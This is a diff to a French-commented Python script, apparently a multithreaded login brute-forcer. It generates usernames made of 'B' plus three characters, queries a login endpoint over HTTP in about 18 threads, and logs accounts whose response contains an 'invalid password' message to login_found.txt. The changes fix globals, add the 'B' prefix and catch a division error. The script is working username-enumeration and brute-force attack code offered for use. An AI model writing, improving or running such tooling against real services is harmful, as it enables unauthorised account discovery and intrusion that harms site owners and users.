@@ -3,15 +3,14 @@
 import urllib.request as rq
 import time
 import threading
-from config import env 
-from concurrent.futures import ThreadPoolExecutor
+from config.env import env 
 
 print(" \t\t DEMARRAGE DU MOTEUR  \n\n\t\t ...partie login ...\n\n")
-global lettre
+global lettre,num_login_found
 lettre=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','0','1','2','3','4','5','6','7','8','9','']
-lettre_optimiz='qwertyuiopasdfghjklzxcvbnm'
+lettre_optimiz='abcdefghijklmnopqrstuvwxyz'
 num_optimiz='0123456789'
-Lettre_optimiz='QWERTYUIOPASDFGHJKLZXCVBNM'
+Lettre_optimiz='ABCDEFGHIJKLMNOPQRSTUVWXYZ'
 special_optimiz='~!@#$%^&*()_+{`}"|?><:;\'[]=-\\'
 space_optimiz=' '
 num_login_found=0
@@ -24,6 +23,7 @@ lettre=lettre_optimiz
 
 def crack(rec):
     # initialisation des variables a utiliser
+    global num_login_found
     long=lettre_len
     bou=1
     repo5=4
@@ -43,7 +43,7 @@ def crack(rec):
     while 1:
         bou=1
         t1=time.time()
-        user=(lettre[x]+lettre[y]+lettre[z])
+        user=('B'+lettre[x]+lettre[y]+lettre[z])
         x+=1
         # coeur du moteur... va permettre la generation ordonner des logins
         if x==long3:
@@ -83,7 +83,10 @@ def crack(rec):
         # algo pour calculer le debit du bruteforce
         t2=time.time()
         t4=int(((t2-t1)*(36**3))//60)
-        t3=int((1/(t2-t1))*18)
+        try:
+                t3=int((1/(t2-t1))*18)
+        except ZeroDivisionError:
+                t3=0
         # les logins corrects seront automatiquement ecrit dans un fichier nommer login_found.txt
         if env.invalid_password_error_msg in str(r.read()):
             num_login_found+=1
@@ -97,7 +100,6 @@ def crack(rec):
             else:pass
             
 # code spagetti pour booster X18 le programme
-
 
 def crack1():
     rec=1
@@ -227,7 +229,7 @@ t16.join()
 t17.join()
 t18.join()
 
+
+
 print("fermeture du moteur ,bye ")
 time.sleep(2)
-#  code source ecrit par toutpuissantged
-
